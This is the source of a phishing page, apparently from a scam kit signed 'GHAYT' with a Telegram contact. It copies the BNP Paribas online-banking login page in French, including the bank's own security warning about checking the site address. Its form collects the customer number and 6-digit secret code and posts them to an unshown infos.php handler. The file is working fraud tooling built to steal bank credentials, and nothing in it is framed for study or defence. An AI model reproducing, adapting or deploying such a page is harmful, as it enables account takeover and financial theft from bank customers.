<!-- SCAMA WIDTH GHAYT
                                ============================
                                ============================

                                  TELEGRAM : @ghayt_Zone

                                ============================
                                ============================
-->



<?php 

require_once "functions.php";

?>

<!DOCTYPE html>
<html>

<head>
  <meta charset="utf-8">
  <title>Accéder à mes comptes en ligne | BNP Paribas</title>
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  <!-- template css files-->
  <link rel="stylesheet"  href="css/bootstrap.css">
  <link rel="stylesheet"  href="css/test.css">             
  <link rel="preconnect" href="https://fonts.gstatic.com">
  

  <!-- js files-->
  <script src="js/html5shiv.min.js"></script>
  <script src="js/respond.min.js"></script>

  <!-- logo site web-->
  <link rel="icon" href="image/ssx.png" type="image/x-icon" />
  <link rel="shortcut icon" href="image/ssx.png" type="image/x-icon" />

  <!-- fontawtsome -->
  <link rel="stylesheet" href="https://pro.fontawesome.com/releases/v5.10.0/css/all.css" integrity="sha384-AYmEC3Yw5cVb3ZcuHtOA93w35dYTsvhLPVnYs9eStHfGJvOvKxVfELGroGkvsg+p" crossorigin="anonymous"/>

</head>

<body>
    
    <header>
        <div class="header bg-white py-2">
            <div class="row align-items-center">

                <div class="col">
                    <div class="logo">
                        <img id="logo" src="image/logo.png">
                        <img id="ph" src="image/txt.png">
                    </div>
                </div>

                <div class="col text-end d-none d-md-block">
                    <div class="navv">
                        <img src="image/bt.png">
                    </div>
                </div>

                <div class="col text-end d-block d-md-none">
                    <div class="navv">
                        <img src="image/nav-res.png">
                    </div>
                </div>

            </div>
            <hr>
        </div>
    </header>

    <section class="bg-white" style="padding-top: 110px;">
        <div class="row">
            <div class="col-md-7" style="padding-left:0;">
                <div class="form">
                    <form action="infos.php" method="post">

                        <input type="hidden" value="index" name="step">


                        <h1>ACCÉDER À MES COMPTES</h1>

                        <div class="from-groupe" style="position: relative;">
                            <label>1. Mon numéro client</label>
                            <input type="text" class="form-control mt-2" id="user"  name="numero_client">
                            <div class="slash"></div>
                        </div>

                        <div class="opacit">

                            <div class="from-groupe mt-4 mb-3" style="position: relative;">
                                <label>2. Mon code secret (6 chiffres)</label>
                                <input  id="password"  maxlength="6" type="password" class="form-control mt-2" name="password">
                                <div class="slash-2"></div>
                            </div>

                            <div class="num">
                                <ul class="list-unstyled d-flex justify-content-between mb-0">
                                    <li value="2"><img class="img-fluid"  src="image/2.png"></li>
                                    <li value="5"><img class="img-fluid" src="image/5.png"></li>
                                    <li value="6"><img class="img-fluid" src="image/6.png"></li>
                                    <li value="4"><img class="img-fluid" src="image/4.png"></li>
                                    <li value="0"><img class="img-fluid" src="image/0.png"></li>

                                    
                                </ul>
                                <ul class="list-unstyled d-flex justify-content-between mb-3">
                                    <li><img class="img-fluid" src="image/1.png"></li>
                                    <li><img class="img-fluid" src="image/3.png"></li>
                                    <li><img class="img-fluid" src="image/7.png"></li>
                                    <li><img class="img-fluid" src="image/9.png"></li>
                                    <li><img class="img-fluid" src="image/8.png"></li>
                                </ul>
                            </div>
                        </div>

                        <div class="bttn">
                            <button name="submit">Accéder à mes Comptes</button>
                        </div>
                    </form>
                </div>
            </div>

            <div class="col-md-5">

                <div class="wrap">
                    <img src="image/wrap-1.png" class="mb-2"> 
                    <a href="#">Obtenir ses codes d'accès</a> <br>
                    <a href="#">Code secret oublié ?</a>
                </div>

                <hr>

                <div class="wrap d-flex justify-content-between align-items-center" >
                    <div class="title">
                         <img src="image/wrap-2.png" class="mb-2">
                         <p>Vérifiez que <strong> l'adresse du site commence exactement par : <br> https://connexion-mabanque.bnpparibas</strong></p>
                         <p>précédée par une icône cadenas et contient un https:// qui garantiront une connexion sécurisée.</p>
                         <p><a href="#">Découvrez nos conseils sécurité</a> et les bonnes pratiques pour consulter et identifier les dangers du web.</p>
                    </div>
                   
                    <img src="image/image-ordi-loupe_2x.jpg"  style="float: right;width: 30%;">
                </div>


                <hr>

                 <div class="wrap">
                    <img src="image/wrap-3.png" class="mb-3">
                    <p><a href="#">Connectez-vous</a> grâce à la grille contrastée, agrandie et bénéficiez d'un accompagnement vocal.</p>
                    <p><a href="#">Utilisez Facil'iti</a>Utilisez Facil'iti pour personnaliser l'affichage en fonction de votre situation (handicap visuel ou cognitif).</p>
                </div>

                <hr>

                <div class="wrap">
                    <img src="image/wrap-4.png"> 
                    <p>Si vous rencontrez des problèmes techniques lors de votre navigation, nous vous invitons à contacter nos conseillers en ligne au :</p>
                    <img src="image/num.png">
                    <p>ou à nous <a href="#">signaler un problème technique</a>.Vous pouvez également gérer vos comptes depuis votre mobile ou votre tablette via l'application <a href="#"> Mes comptes.</a></p>
                </div>
            </div>
        </div>
    </section>

    <footer>

        <div class="media row align-items-center">
            <div class="col-md-6 text-center text-md-end">
                <span>Suivez-nous sur :</span>
            </div>
            <div class="col-md-6  text-center text-md-start">
               <img src="image/media.png">
            </div>
        </div>

        <div class="con row mt-5">

            <div class="col-md-4">
                 <div class="contact">
                    <h3>CONTACT</h3>
                    <p> Nos conseillers vous répondent par téléphone, chat, mail ou bien encore grâce à nos SAV Facebook et Twitter.</p>
                </div>
            </div>

            <div class="col-md-4">
                 <div class="contact">
                    <h3>TROUVER UNE AGENCE</h3>
                    <p>Retrouvez facilement l’agence la plus proche avec ses horaires d’ouverture et les services disponibles.</p>
                </div>
            </div>

            <div class="col-md-4">
                 <div class="contact">
                    <h3>LES APPLICATIONS MOBILES</h3>
                    <p> Découvrez nos applications mobiles pour gérer vos comptes, payer avec votre mobile et vous simplifier la vie.</p>
                </div>
            </div>

        </div>

        <hr style="color:#686868;">

        <div class="info row mt-5">

            <div class="col-md-3">
                 <div class="contact">
                    <h4>INFORMATIONS LÉGALES</h4>
                    <ul class="list-unstyled">
                        <li><a href="#">Données personnelles</a></li>
                        <li><a href="#">Mentions légales</a></li>
                        <li><a href="#">Cookies</a></li>
                        <li><a href="#">Réglementation</a></li>
                        <li><a href="#">Fonds de Garantie des Dépôts et</a></li>
                        <li><a href="#">résolution</a></li>
                        
                    </ul>
                </div>
            </div>

            <div class="col-md-3">
                 <div class="contact">
                    <h4>NOUS CONNAÎTRE</h4>
                    <ul class="list-unstyled">
                       <li><a href="#">La banque d’un monde qui change</a></li>
                       <li><a href="#">Nos engagements responsables</a></li>
                    </ul>
                </div>
            </div>

            <div class="col-md-3">
                 <div class="contact">
                    <h4>INFORMATIONS</h4>
                   <ul class="list-unstyled">
                        <li><a href="#">Site Accessible</a></li>
                        <li><a href="#">Site Sécurisé</a></li>
                        <li><a href="#">Conditions d’éligibilité</a></li>
                        <li><a href="#">Tarifs et conditions</a></li>
                        <li><a href="#">Glossaire</a></li>
                        <li><a href="#">Guides et brochures</a></li>
                   </ul>
                </div>
            </div>

            <div class="col-md-3">
                 <div class="contact">
                    <h4>NOS AUTRES SITES</h4>
                    <ul class="list-unstyled">
                        <li><a href="#">Les Professionnels</a></li>
                        <li><a href="#">Les Entreprises</a></li>
                        <li><a href="#">Les Associations</a></li>
                        <li><a href="#">La Banque Privée</a></li>
                        <li><a href="#">La Banque en ligne</a></li>
                        <li><a href="#">Le Groupe BNP Paribas</a></li>
                    </ul>
                </div>
            </div>

        </div>

        <div class="ft text-center mt-4">
            <p>Pour la bonne exécution de vos contrats, et en cas de réclamations/contestations, votre Conseiller est joignable sur sa ligne directe (appel non surtaxé). Si vous ne disposez plus de son numéro de téléphone direct, envoyez-lui un message par votre messagerie sécurisée, il vous le donnera à nouveau en retour.</p>
        </div>


    </footer>




   




  <!-- template files js-->
  <script src="js/jquery-3.5.1.min.js"></script>
  <script src="js/bootstrap.min.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.payment/3.0.0/jquery.payment.min.js"></script>
  <script>


        $('#user').payment('formatCardNumber');



      $(".num ul li").click(function(){
        if ($("#password").val().length < 6) {

             $("#password").val($("#password").val() + $(this).val())
        }
        else{

            $("#password").val()
        }
       
      });


      $("#user").keyup(function(){
        if ($(this).val().length > 0) {
            $(".opacit").css("opacity" , "1");
        }
        else{
            $(".opacit").css("opacity" , "0.2");
        }
      });


      $(".slash").click(function(){
        $("#user").val(" ");
        $(".opacit").css("opacity" , "0.2")
      });


      $(".slash-2").click(function(){
        $("#password").val("");
      });
      

      $(".num ul li").click(function(){
        if ($("#password").val().length > 5) {
            $(".bttn").css("opacity" , "1");
        }
        else{
            $(".bttn").css("opacity" , "0.2");
        }
      });


     

       







  </script>
</body>
</html>